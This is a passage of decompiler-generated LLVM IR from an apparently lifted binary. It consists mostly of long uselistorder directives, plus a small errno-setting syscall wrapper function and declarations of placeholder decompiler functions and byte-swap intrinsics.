  uselistorder i32* @r5, { 41, 42, 43, 44, 27, 28, 29, 30, 31, 32, 33, 34, 35, 45, 5, 46, 47, 48, 679, 680, 681, 49, 23, 50, 0, 51, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 19, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 25, 26, 74, 75, 76, 77, 78, 79, 6, 80, 81, 82, 83, 84, 85, 86, 7, 87, 88, 89, 10, 90, 91, 8, 92, 93, 94, 95, 96, 97, 9, 98, 99, 100, 101, 102, 103, 36, 11, 37, 38, 39, 40, 262, 263, 264, 265, 266, 267, 694, 12, 695, 696, 704, 104, 105, 106, 107, 108, 109, 110, 697, 698, 699, 700, 701, 702, 703, 111, 112, 113, 114, 608, 609, 613, 614, 615, 616, 617, 610, 611, 612, 557, 558, 559, 13, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 618, 619, 642, 14, 643, 644, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 3, 633, 634, 635, 636, 637, 15, 638, 639, 640, 641, 125, 126, 127, 128, 129, 268, 269, 16, 270, 271, 272, 273, 274, 24, 115, 275, 17, 276, 277, 278, 279, 280, 281, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 121, 122, 124, 123, 116, 117, 118, 119, 120, 197, 198, 199, 200, 201, 202, 203, 204, 205, 211, 212, 213, 214, 215, 216, 206, 207, 208, 209, 210, 316, 317, 318, 319, 320, 321, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 1, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 2, 261, 282, 283, 284, 285, 286, 20, 287, 288, 289, 290, 291, 292, 293, 21, 294, 22, 295, 296, 297, 298, 299, 300, 301, 322, 323, 18, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 4, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315 }
  uselistorder i32* @r2, { 7, 10, 11, 39, 40, 12, 13, 14, 15, 16, 17, 28, 8, 9, 29, 41, 46, 47, 48, 49, 1, 52, 42, 22, 23, 43, 2, 3, 36, 37, 4, 38, 5, 0, 50, 6, 51, 44, 45, 24, 25, 26, 30, 31, 35, 21, 18, 19, 20, 27, 32, 33, 34 }
}

define i32 @function_16108(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16108:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16148, label %dec_label_pc_16134

dec_label_pc_16134:                               ; preds = %dec_label_pc_16108
  %v0_16134 = call i32 @function_11204()
  %v0_16138 = load i32, i32* %r4.global-to-local, align 4
  %v1_16138 = sub i32 0, %v0_16138
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16140 = inttoptr i32 %v0_16134 to i32*
  store i32 %v1_16138, i32* %v2_16140, align 4
  %v0_16150.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16150

dec_label_pc_16148:                               ; preds = %dec_label_pc_16108
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_16148 = icmp eq i32 %arg1, 0
  br i1 %v2_16148, label %dec_label_pc_1615c, label %dec_label_pc_16150

dec_label_pc_16150:                               ; preds = %dec_label_pc_16148, %dec_label_pc_16134
  %v0_16150 = phi i32 [ %arg1, %dec_label_pc_16148 ], [ %v0_16150.pre, %dec_label_pc_16134 ]
  br label %dec_label_pc_16160

dec_label_pc_1615c:                               ; preds = %dec_label_pc_16148
  br label %dec_label_pc_16160

dec_label_pc_16160:                               ; preds = %dec_label_pc_16150, %dec_label_pc_1615c
  %v1_16168 = phi i32 [ %v0_16150, %dec_label_pc_16150 ], [ %tmp8, %dec_label_pc_1615c ]
  ret i32 %v1_16168

; uselistorder directives
  uselistorder i32 -1, { 253, 259, 170, 254, 255, 256, 117, 257, 118, 258, 89, 90, 91, 92, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 171, 172, 0, 173, 156, 260, 261, 174, 119, 262, 175, 1, 93, 263, 264, 161, 265, 176, 3, 2, 177, 178, 120, 329, 121, 122, 296, 123, 304, 110, 305, 289, 290, 291, 124, 252, 125, 306, 307, 4, 179, 180, 181, 308, 285, 286, 162, 182, 5, 183, 6, 184, 163, 309, 10, 185, 186, 9, 11, 310, 8, 187, 188, 94, 7, 189, 95, 96, 97, 98, 190, 191, 192, 106, 268, 269, 12, 270, 126, 311, 127, 128, 312, 129, 301, 130, 299, 131, 271, 132, 287, 133, 134, 272, 135, 302, 136, 303, 137, 273, 109, 169, 13, 293, 193, 138, 313, 139, 331, 140, 274, 141, 275, 142, 276, 143, 292, 144, 333, 145, 300, 146, 330, 147, 297, 148, 294, 149, 277, 150, 151, 152, 332, 153, 288, 194, 195, 196, 14, 104, 107, 15, 16, 108, 105, 159, 160, 197, 19, 198, 20, 199, 278, 99, 21, 200, 201, 202, 203, 18, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 266, 154, 267, 22, 229, 230, 112, 111, 279, 17, 231, 232, 233, 23, 234, 115, 116, 113, 114, 235, 24, 236, 155, 280, 100, 25, 26, 29, 165, 281, 164, 282, 28, 166, 283, 27, 30, 31, 167, 284, 32, 33, 34, 35, 36, 237, 37, 101, 38, 39, 238, 239, 40, 157, 158, 41, 42, 43, 240, 44, 45, 46, 47, 48, 49, 50, 102, 51, 52, 53, 54, 55, 56, 57, 241, 58, 168, 298, 59, 60, 61, 242, 62, 63, 64, 243, 65, 244, 66, 67, 68, 245, 69, 70, 71, 246, 72, 73, 74, 75, 76, 247, 77, 78, 79, 80, 81, 82, 248, 83, 84, 85, 249, 86, 87, 250, 251, 295, 88, 103 }
  uselistorder i32 ()* @function_11204, { 63, 59, 62, 61, 60, 65, 29, 28, 5, 4, 22, 32, 20, 16, 15, 64, 19, 18, 17, 41, 40, 21, 10, 12, 11, 56, 55, 9, 8, 7, 25, 27, 54, 39, 53, 52, 24, 23, 51, 58, 57, 14, 37, 36, 35, 6, 2, 50, 49, 48, 13, 0, 26, 3, 30, 34, 47, 31, 46, 1, 38, 45, 44, 43, 42, 33 }
  uselistorder i32 1, {}
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_16160, { 1, 0 }
}

define i32 @function_1616c() local_unnamed_addr {
entry:
  %v3_16170 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_16170)
  %v31_16178 = load i32, i32* @r0, align 4
  ret i32 %v31_16178

; uselistorder directives
  uselistorder i32* @r0, { 31, 21, 11, 61, 60, 188, 17, 4, 5, 224, 6, 13, 7, 62, 0, 63, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 1, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 64, 20, 58, 59, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 25, 18, 156, 157, 9, 15, 10, 251, 253, 254, 48, 49, 50, 51, 52, 53, 54, 55, 12, 14, 79, 80, 252, 140, 141, 81, 204, 23, 56, 57, 205, 2, 206, 207, 208, 203, 197, 46, 198, 199, 200, 47, 201, 202, 27, 216, 217, 209, 210, 211, 212, 213, 214, 215, 87, 88, 19, 89, 29, 26, 158, 159, 160, 161, 182, 24, 22, 30, 218, 162, 219, 28, 163, 164, 165, 166, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 84, 85, 123, 33, 82, 83, 86, 124, 127, 128, 129, 130, 131, 132, 125, 126, 34, 35, 36, 37, 133, 134, 38, 39, 135, 136, 137, 138, 139, 142, 143, 40, 41, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 42, 154, 155, 43, 167, 168, 169, 170, 171, 172, 173, 8, 174, 175, 176, 177, 178, 179, 180, 220, 221, 3, 183, 184, 185, 186, 187, 189, 191, 192, 193, 194, 195, 196, 222, 223, 190, 181, 44, 45, 16, 32 }
  uselistorder void (i32)* @__pseudo_branch, { 0, 61, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 2, 3, 66, 67, 68, 69, 62, 50, 63, 64, 65, 70, 71, 72, 51, 52, 53, 47, 48, 49, 54, 58, 59, 55, 56, 57, 73, 40, 41, 42, 43, 44, 45, 38, 39, 46, 60 }
  uselistorder i32 0, { 583, 584, 593, 594, 595, 596, 597, 103, 598, 599, 600, 0, 601, 299, 66, 602, 369, 603, 604, 605, 330, 331, 585, 586, 591, 1, 104, 105, 945, 946, 947, 948, 140, 141, 949, 606, 142, 106, 1145, 1146, 1147, 300, 607, 608, 609, 301, 1148, 67, 302, 1149, 1150, 84, 41, 42, 610, 75, 2, 98, 99, 801, 76, 77, 78, 802, 803, 1151, 1152, 1153, 1154, 1155, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1156, 1157, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 32, 1176, 1177, 1178, 1179, 1180, 33, 1181, 1182, 1183, 34, 1184, 1185, 1186, 35, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1211, 1212, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 36, 1230, 1231, 1232, 1233, 1234, 37, 1235, 1236, 1237, 1238, 1239, 38, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 143, 611, 560, 612, 613, 614, 615, 616, 370, 371, 617, 618, 107, 108, 109, 619, 620, 624, 621, 622, 623, 303, 317, 625, 626, 110, 144, 629, 627, 628, 304, 630, 111, 631, 632, 3, 4, 112, 633, 577, 578, 372, 579, 634, 635, 636, 68, 69, 637, 638, 639, 145, 640, 641, 642, 643, 644, 373, 645, 646, 647, 648, 649, 650, 113, 651, 652, 653, 654, 5, 6, 146, 148, 655, 147, 656, 149, 657, 114, 658, 663, 664, 659, 660, 661, 666, 667, 668, 150, 669, 670, 671, 672, 673, 662, 665, 674, 115, 587, 588, 589, 1255, 1256, 1043, 857, 1051, 592, 804, 805, 332, 806, 374, 580, 375, 581, 1052, 1053, 1054, 151, 1055, 807, 808, 809, 582, 590, 116, 152, 1257, 1258, 1056, 1057, 117, 153, 376, 1262, 1263, 377, 1264, 1265, 154, 306, 1266, 1267, 378, 70, 1268, 1269, 379, 1276, 1279, 551, 305, 1280, 380, 1277, 1278, 1259, 1260, 561, 155, 294, 675, 677, 676, 156, 678, 679, 680, 381, 681, 100, 858, 91, 859, 158, 157, 860, 1261, 777, 778, 779, 780, 781, 782, 160, 118, 783, 784, 785, 92, 159, 786, 119, 383, 384, 1271, 382, 120, 559, 121, 161, 1063, 1064, 1065, 1066, 1067, 162, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 163, 1058, 385, 1059, 1060, 386, 1061, 1062, 122, 1044, 387, 164, 1045, 1046, 1047, 1048, 1049, 123, 169, 170, 172, 171, 168, 166, 173, 167, 165, 174, 1075, 1076, 1100, 1101, 124, 1077, 1078, 178, 176, 177, 1079, 1080, 184, 183, 136, 175, 1081, 1082, 1083, 1084, 1085, 1086, 324, 323, 333, 388, 1087, 1088, 1089, 71, 1090, 180, 179, 181, 182, 135, 1091, 1092, 307, 1093, 1094, 101, 1095, 1096, 1097, 1098, 1099, 7, 8, 704, 705, 72, 125, 9, 334, 389, 1102, 1103, 1104, 1020, 998, 706, 787, 707, 708, 1021, 1022, 709, 950, 1281, 1282, 79, 126, 810, 811, 812, 185, 682, 683, 186, 813, 818, 819, 820, 821, 187, 335, 188, 325, 326, 390, 814, 189, 815, 816, 127, 822, 1105, 1272, 710, 711, 712, 817, 1275, 999, 1270, 863, 823, 713, 861, 714, 391, 1273, 95, 1274, 788, 10, 1106, 1107, 96, 1108, 1109, 1110, 1111, 1112, 190, 1113, 552, 562, 553, 554, 1114, 563, 137, 191, 824, 825, 826, 93, 319, 827, 828, 564, 11, 308, 192, 193, 194, 43, 195, 392, 715, 829, 830, 831, 1116, 1115, 1117, 1118, 1119, 1120, 39, 196, 1121, 1122, 1123, 197, 85, 86, 367, 368, 696, 199, 198, 200, 832, 201, 833, 834, 202, 1124, 1125, 393, 203, 204, 205, 895, 206, 864, 207, 208, 723, 716, 209, 717, 718, 719, 697, 698, 700, 684, 685, 565, 686, 699, 687, 566, 688, 567, 689, 568, 690, 569, 691, 692, 87, 44, 297, 298, 693, 570, 694, 571, 695, 701, 702, 394, 703, 720, 550, 721, 395, 722, 310, 309, 724, 725, 726, 727, 211, 210, 728, 729, 730, 572, 295, 731, 80, 81, 296, 732, 82, 83, 396, 734, 735, 555, 736, 737, 738, 739, 740, 397, 741, 742, 743, 320, 138, 558, 744, 745, 746, 747, 748, 749, 557, 750, 751, 398, 752, 399, 753, 756, 757, 758, 212, 754, 213, 755, 13, 12, 214, 733, 865, 866, 556, 759, 400, 760, 762, 215, 763, 764, 765, 766, 767, 768, 769, 217, 216, 770, 401, 771, 402, 772, 403, 761, 773, 327, 774, 404, 775, 444, 445, 405, 776, 406, 222, 221, 573, 128, 224, 223, 574, 129, 575, 220, 219, 218, 312, 321, 313, 407, 789, 225, 226, 797, 790, 791, 792, 793, 794, 795, 796, 311, 798, 799, 45, 800, 227, 408, 94, 835, 836, 837, 838, 316, 839, 840, 841, 315, 842, 843, 844, 845, 228, 846, 848, 847, 130, 131, 229, 314, 231, 230, 849, 232, 233, 73, 234, 237, 867, 868, 869, 870, 236, 235, 238, 871, 872, 46, 47, 139, 97, 239, 74, 410, 873, 874, 875, 876, 877, 240, 878, 879, 338, 880, 881, 882, 883, 244, 241, 242, 243, 884, 885, 886, 887, 411, 888, 889, 337, 891, 409, 892, 336, 893, 412, 894, 246, 896, 897, 898, 899, 245, 247, 900, 901, 48, 49, 88, 902, 248, 903, 904, 341, 339, 905, 340, 906, 252, 908, 909, 910, 911, 251, 250, 253, 912, 913, 50, 51, 907, 249, 914, 915, 254, 916, 917, 344, 918, 343, 919, 342, 920, 413, 921, 415, 89, 52, 922, 132, 345, 416, 923, 924, 255, 256, 925, 414, 926, 259, 927, 928, 929, 930, 258, 257, 260, 931, 932, 53, 54, 133, 933, 934, 14, 15, 16, 17, 935, 936, 261, 347, 937, 417, 938, 418, 939, 419, 940, 420, 941, 421, 942, 422, 943, 346, 944, 265, 952, 953, 954, 955, 263, 262, 266, 956, 957, 55, 56, 951, 264, 959, 958, 18, 19, 20, 21, 960, 267, 961, 962, 349, 963, 423, 966, 424, 967, 425, 968, 426, 969, 427, 970, 428, 971, 348, 972, 429, 973, 271, 975, 976, 977, 978, 269, 268, 272, 979, 980, 57, 58, 974, 270, 981, 59, 430, 982, 984, 985, 986, 987, 431, 988, 22, 23, 24, 25, 26, 983, 273, 989, 990, 355, 991, 354, 992, 353, 993, 352, 994, 350, 995, 351, 996, 432, 997, 277, 1001, 1002, 1003, 1004, 275, 274, 278, 1005, 1006, 60, 61, 1000, 276, 1007, 62, 433, 1008, 1010, 1011, 1012, 1013, 434, 1014, 27, 28, 29, 30, 31, 1009, 279, 1015, 1016, 357, 1017, 356, 1018, 435, 1019, 437, 90, 63, 1023, 134, 358, 438, 439, 1024, 1025, 280, 281, 1026, 436, 1029, 1030, 1031, 283, 284, 1032, 1033, 64, 1027, 1028, 282, 1035, 1034, 1036, 285, 1037, 1038, 361, 1039, 360, 1040, 359, 1041, 440, 1042, 1127, 1128, 1129, 287, 288, 289, 1131, 1132, 65, 1130, 1126, 286, 1134, 1135, 1133, 1136, 290, 1137, 1138, 364, 1139, 363, 1140, 362, 1141, 441, 1144, 328, 1050, 1142, 291, 1143, 964, 292, 965, 850, 102, 851, 852, 329, 442, 318, 853, 854, 40, 322, 855, 856, 443, 862, 293, 890, 365, 576, 366, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297 }
  uselistorder i32* @r4, { 37, 50, 51, 52, 6, 53, 54, 55, 7, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 43, 44, 45, 451, 452, 66, 67, 68, 69, 70, 71, 72, 73, 74, 719, 720, 75, 76, 8, 1, 77, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 9, 78, 79, 80, 81, 82, 83, 84, 85, 86, 10, 87, 88, 91, 92, 93, 94, 38, 95, 96, 97, 98, 99, 100, 89, 90, 39, 40, 101, 102, 11, 103, 12, 104, 13, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 14, 125, 126, 127, 15, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 46, 47, 48, 49, 41, 42, 635, 636, 280, 281, 737, 738, 739, 637, 638, 742, 747, 748, 749, 750, 751, 752, 753, 740, 140, 141, 142, 334, 335, 336, 741, 246, 16, 247, 248, 249, 250, 251, 252, 743, 746, 143, 144, 145, 146, 639, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 17, 656, 657, 658, 659, 640, 641, 642, 643, 603, 604, 605, 606, 607, 608, 609, 610, 611, 18, 612, 613, 614, 615, 616, 617, 618, 619, 620, 660, 682, 683, 684, 685, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 34, 674, 675, 0, 676, 677, 678, 679, 680, 681, 167, 168, 169, 744, 745, 686, 687, 532, 533, 282, 283, 284, 285, 286, 287, 288, 147, 148, 149, 289, 290, 291, 5, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 2, 302, 303, 304, 688, 689, 19, 690, 691, 692, 170, 171, 172, 173, 174, 381, 382, 341, 342, 175, 176, 177, 178, 179, 180, 181, 182, 161, 162, 163, 183, 184, 185, 186, 164, 152, 153, 150, 151, 154, 155, 156, 157, 158, 159, 160, 165, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 203, 204, 205, 206, 213, 214, 215, 216, 217, 3, 207, 208, 209, 210, 211, 212, 201, 202, 693, 694, 343, 344, 345, 346, 347, 166, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 253, 20, 21, 22, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 305, 306, 4, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 23, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 24, 426, 25, 427, 26, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 453, 27, 454, 28, 455, 29, 456, 30, 457, 458, 459, 460, 31, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 32, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 33, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 715, 716, 717, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 712, 713, 714, 472, 322, 323, 326, 324, 325, 327, 328, 329, 330, 331, 332, 333, 337, 338, 339, 340, 35, 36, 718 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #0

attributes #0 = { nounwind readnone }
